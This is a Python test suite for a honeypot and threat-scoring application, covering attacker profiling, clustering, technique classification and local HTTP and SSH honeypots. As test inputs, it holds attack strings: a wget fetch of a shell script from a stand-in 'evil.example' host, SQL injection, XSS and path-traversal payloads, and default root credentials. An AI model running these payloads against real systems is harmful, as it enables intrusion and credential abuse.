"""
Formal v2 test suite.
Run:  python -m pytest tests/ -v
"""
import sys, os, time, socket
from pathlib import Path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import urllib.request, urllib.error, paramiko

from app.intel.scoring import ThreatRegistry
from app.intel.cluster_engine import ClusterEngine
from app.intel.geolocate import offline_bearing
from app.intel.signatures import classify_techniques, is_common_credential_pair
from app.intel.dna_engine import profile_to_dna, dna_cell_color
from app.capture.event_bus import HoneypotEvent, bus
from app.capture.event_store import EventStore
from app.capture.http_honeypot import HttpHoneypot
from app.capture.ssh_honeypot import SshHoneypot


def test_bdi_v2_benign_vs_aggressive_separation():
    reg = ThreatRegistry()
    b = reg.get_or_create("203.0.113.1")
    b.register_event(service="http", path="/", raw_text="/")
    a = reg.get_or_create("198.51.100.77")
    for path in ["/admin","/.env","/wp-login.php","/phpmyadmin/"]:
        a.register_event(service="http", path=path, raw_text=path+" union select ../../etc/passwd")
    for u,p in [("root","root"),("admin","admin"),("root","123456")]:
        a.register_event(service="ssh", username=u, password=p)
    assert b.bdi() < 20
    assert a.bdi() > 55


def test_bdi_v2_automation_score_bot_vs_human():
    reg = ThreatRegistry()
    bot = reg.get_or_create("10.0.0.1")
    now = time.time()
    bot.event_timestamps = [now - i * 0.5 for i in range(20)]  # perfectly regular
    bot.total_events = 20
    human = reg.get_or_create("10.0.0.2")
    import random; rng = random.Random(42)
    human.event_timestamps = [now - rng.uniform(0, 300) for _ in range(15)]
    human.total_events = 15
    assert bot.automation_score() > 0.6
    assert human.automation_score() < bot.automation_score()


def test_threat_dna_unique_per_profile():
    reg = ThreatRegistry()
    p1 = reg.get_or_create("1.1.1.1")
    p1.register_event(service="http", path="/admin", raw_text="/admin union select")
    p2 = reg.get_or_create("2.2.2.2")
    p2.register_event(service="ssh", username="root", password="toor")
    dna1 = profile_to_dna(p1)
    dna2 = profile_to_dna(p2)
    assert len(dna1) == 32
    assert len(dna2) == 32
    assert dna1 != dna2


def test_threat_dna_colors_valid_hex():
    reg = ThreatRegistry()
    p = reg.get_or_create("3.3.3.3")
    p.register_event(service="http", path="/.env", raw_text="/.env")
    dna = profile_to_dna(p)
    for i in range(32):
        color = dna_cell_color(dna, i)
        assert color.startswith("#") and len(color) == 7


def test_cluster_detection_min_threshold():
    ce = ClusterEngine()
    # Only 2 IPs from same /24 — should NOT trigger cluster
    for i in range(2):
        ce.register_event(f"192.168.5.{10+i}")
    assert len(ce.active_clusters()) == 0
    # Add a 3rd — now should trigger
    ce.register_event("192.168.5.15")
    assert len(ce.active_clusters()) == 1
    assert ce.active_clusters()[0].member_count == 3


def test_technique_classification_accuracy():
    assert "SQL_INJECTION" in classify_techniques("' UNION SELECT 1,2,3 --")
    assert "PATH_TRAVERSAL" in classify_techniques("../../etc/passwd")
    assert "RCE_ATTEMPT" in classify_techniques("wget http://evil.example/shell.sh")
    assert "XSS" in classify_techniques("<script>alert(1)</script>")
    assert len(classify_techniques("Hello, world!")) == 0


def test_event_store_v2_count_for_ip():
    db = Path("/tmp/test_v2_store.db")
    if db.exists(): db.unlink()
    store = EventStore(db_path=db)
    store.save(HoneypotEvent(service="http", ip="5.5.5.5", path="/admin"))
    store.save(HoneypotEvent(service="ssh", ip="5.5.5.5", username="root", password="root"))
    store.save(HoneypotEvent(service="http", ip="6.6.6.6", path="/.env"))
    assert store.count_for_ip("5.5.5.5") == 2
    assert store.count_for_ip("6.6.6.6") == 1
    assert store.count_for_ip("9.9.9.9") == 0
    db.unlink()


def test_http_honeypot_technique_tags_captured():
    hp = HttpHoneypot(host="127.0.0.1", port=8299)
    hp.start(); time.sleep(0.3)
    try:
        try:
            urllib.request.urlopen("http://127.0.0.1:8299/.env", timeout=2)
        except urllib.error.HTTPError:
            pass
        time.sleep(0.2)
        events = bus.drain()
        env_events = [e for e in events if "/.env" in e.path or ".env" in e.path]
        assert len(env_events) > 0
    finally:
        hp.stop()


def test_ssh_honeypot_always_rejects():
    hp = SshHoneypot(host="127.0.0.1", port=2399)
    hp.start(); time.sleep(0.3)
    try:
        sock = socket.create_connection(("127.0.0.1", 2399), timeout=3)
        transport = paramiko.Transport(sock)
        try:
            transport.start_client(timeout=5)
            rejected = False
            try:
                transport.auth_password("root", "toor")
            except paramiko.AuthenticationException:
                rejected = True
            assert rejected
        finally:
            transport.close()
        time.sleep(0.2)
        events = bus.drain()
        assert any(e.service == "ssh" and e.username == "root" for e in events)
    finally:
        hp.stop()


if __name__ == "__main__":
    tests = [(name, obj) for name, obj in list(globals().items()) if name.startswith("test_")]
    passed = 0
    for name, fn in tests:
        fn()
        print(f"PASS  {name}")
        passed += 1
    print(f"\n{passed}/{len(tests)} tests passed.")
